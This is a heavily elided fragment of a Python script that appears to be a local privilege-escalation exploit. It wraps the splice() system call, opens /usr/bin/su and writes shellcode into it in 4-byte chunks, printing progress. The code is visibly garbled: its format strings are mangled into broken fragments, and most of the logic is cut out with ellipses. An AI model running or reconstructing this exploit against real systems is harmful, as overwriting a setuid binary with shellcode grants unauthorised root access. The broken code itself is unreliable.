...
def splice(src, dst, count, offset_src=None, offset_dst=None):
    ...
    if result < 0:
        raise OSError("splice() failed with return code {result' + str(")
    return result
...
print("[+] Opened /usr/bin/su (fd={ ' + str()")
...
print("[+] Shellcode size: {len(e)' + str( bytes")
...
while i < len(e):
    ...
    i += 4
    if i % 16 == 0:
        print("    Written {i' + str(/{len(e)' + str( bytes...")
